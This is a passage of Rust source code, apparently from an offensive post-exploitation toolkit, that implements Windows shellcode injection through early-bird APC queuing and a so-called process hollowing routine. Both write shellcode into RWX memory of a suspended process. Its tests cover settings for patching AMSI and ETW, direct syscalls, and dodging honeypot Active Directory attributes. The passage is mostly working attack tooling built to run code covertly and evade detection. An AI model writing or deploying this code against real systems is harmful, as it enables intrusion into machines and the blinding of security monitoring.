            .map_err(|_| OverthroneError::PostExploitation("invalid target exe".into()))?;

        let si = STARTUPINFOA {
            cb: std::mem::size_of::<STARTUPINFOA>() as u32,
            ..Default::default()
        };
        let mut pi = PROCESS_INFORMATION::default();

        let cmd_pstr = windows::core::PSTR(cmd.as_ptr() as *mut u8);
        CreateProcessA(
            None,
            Some(cmd_pstr),
            None,
            None,
            false,
            PROCESS_CREATION_FLAGS(4), // CREATE_SUSPENDED
            None,
            None,
            &si,
            &mut pi,
        )?;

        let remote_addr = VirtualAllocEx(
            pi.hProcess,
            None,
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        if remote_addr.is_null() {
            CloseHandle(pi.hProcess).ok();
            CloseHandle(pi.hThread).ok();
            return Err(OverthroneError::PostExploitation(
                "VirtualAllocEx failed".into(),
            ));
        }

        let mut bytes_written: usize = 0;
        WriteProcessMemory(
            pi.hProcess,
            remote_addr,
            shellcode.as_ptr() as *const _,
            shellcode.len(),
            Some(&mut bytes_written as *mut _),
        )?;

        QueueUserAPC(
            Some(
                std::mem::transmute::<usize, extern "system" fn(usize) -> ()>(remote_addr as usize),
            ),
            pi.hThread,
            0,
        );

        ResumeThread(pi.hThread);

        let pid = pi.dwProcessId;
        CloseHandle(pi.hProcess).ok();
        CloseHandle(pi.hThread).ok();

        info!(
            "Early bird APC: exe={target_exe}, size={} bytes, pid={pid}",
            shellcode.len()
        );
        Ok(pid)
    }
}

/// # Safety
/// This function performs no actual operations on non-Windows platforms.
/// It is marked `unsafe` for API compatibility with the Windows variant.
#[cfg(not(target_os = "windows"))]
pub unsafe fn early_bird_apc_injection(_target_exe: &str, _shellcode: &[u8]) -> Result<u32> {
    Err(OverthroneError::PostExploitation(
        "Early bird APC not available on this platform".into(),
    ))
}

/// Process injection diversity: **Process Hollowing**.
///
/// Creates a suspended process, allocates RWX memory, writes shellcode,
/// and resumes execution from the shellcode address.
///
/// # Safety
/// The caller must ensure the target executable and injected shellcode are
/// appropriate for the process being launched.
#[cfg(target_os = "windows")]
pub unsafe fn process_hollowing_injection(target_exe: &str, shellcode: &[u8]) -> Result<u32> {
    unsafe {
        use windows::Win32::Foundation::CloseHandle;
        use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
        use windows::Win32::System::Memory::{
            MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx,
        };
        use windows::Win32::System::Threading::{
            CreateProcessA, PROCESS_CREATION_FLAGS, PROCESS_INFORMATION, ResumeThread, STARTUPINFOA,
        };

        let cmd = std::ffi::CString::new(target_exe)
            .map_err(|_| OverthroneError::PostExploitation("invalid target exe".into()))?;

        let si = STARTUPINFOA {
            cb: std::mem::size_of::<STARTUPINFOA>() as u32,
            ..Default::default()
        };
        let mut pi = PROCESS_INFORMATION::default();

        let cmd_pstr = windows::core::PSTR(cmd.as_ptr() as *mut u8);
        CreateProcessA(
            None,
            Some(cmd_pstr),
            None,
            None,
            false,
            PROCESS_CREATION_FLAGS(4), // CREATE_SUSPENDED
            None,
            None,
            &si,
            &mut pi,
        )?;

        let remote_addr = VirtualAllocEx(
            pi.hProcess,
            None,
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        if remote_addr.is_null() {
            CloseHandle(pi.hProcess).ok();
            CloseHandle(pi.hThread).ok();
            return Err(OverthroneError::PostExploitation(
                "VirtualAllocEx failed".into(),
            ));
        }

        let mut bytes_written: usize = 0;
        WriteProcessMemory(
            pi.hProcess,
            remote_addr,
            shellcode.as_ptr() as *const _,
            shellcode.len(),
            Some(&mut bytes_written as *mut _),
        )?;

        ResumeThread(pi.hThread);

        let pid = pi.dwProcessId;
        CloseHandle(pi.hProcess).ok();
        CloseHandle(pi.hThread).ok();

        info!(
            "Process hollowing: exe={target_exe}, size={} bytes, pid={pid}",
            shellcode.len()
        );
        Ok(pid)
    }
}

/// # Safety
/// This function performs no actual operations on non-Windows platforms.
/// It is marked `unsafe` for API compatibility with the Windows variant.
#[cfg(not(target_os = "windows"))]
pub unsafe fn process_hollowing_injection(_target_exe: &str, _shellcode: &[u8]) -> Result<u32> {
    Err(OverthroneError::PostExploitation(
        "Process hollowing not available on this platform".into(),
    ))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_opsec_config_default() {
        let config = OpsecConfig::default();
        assert!(config.patch_amsi);
        assert!(config.patch_etw);
        assert!(config.direct_syscalls);
        assert!(config.aes_only_kerberos);
    }

    #[test]
    fn test_opsec_config_aggressive() {
        let config = OpsecConfig::aggressive();
        assert!(config.patch_amsi);
        assert!(config.patch_etw);
    }

    #[test]
    fn test_opsec_config_minimal() {
        let config = OpsecConfig::minimal();
        assert!(config.patch_amsi);
        assert!(!config.patch_etw);
    }

    #[test]
    fn test_prefer_kerberos_etype() {
        assert_eq!(prefer_kerberos_etype(18), 18);
        assert_eq!(prefer_kerberos_etype(17), 17);
        assert_eq!(prefer_kerberos_etype(23), 18);
        assert_eq!(prefer_kerberos_etype(0), 18); // default to AES
    }

    #[test]
    fn test_honeypot_attrs_detection() {
        let attrs = &[
            "sAMAccountName",
            "ms-mcs-admpwd",
            "cn",
            "msLAPS-EncryptedPassword",
            "msDS-ManagedPassword",
        ];
        let detected = contains_honeypot_attrs(attrs);
        assert_eq!(detected.len(), 3);
        assert!(detected.contains(&"ms-mcs-admpwd"));
        assert!(detected.contains(&"msLAPS-EncryptedPassword"));
        assert!(detected.contains(&"msDS-ManagedPassword"));
    }

    #[test]
    fn test_strip_honeypot_attrs() {
        let attrs = &["sAMAccountName", "ms-Mcs-AdmPwd", "mslaps-password", "cn"];
        let stripped = strip_honeypot_attrs(attrs);
        assert_eq!(stripped.len(), 2);
        assert!(!stripped.contains(&"ms-Mcs-AdmPwd"));
        assert!(!stripped.contains(&"mslaps-password"));
    }

    #[test]
    fn test_opsec_patch_report() {
        let report = OpsecPatchReport {
            name: "AMSI".to_string(),
            success: true,
            detail: "patched".to_string(),
            error: None,
        };
        assert_eq!(report.name, "AMSI");
        assert!(report.success);
    }
}
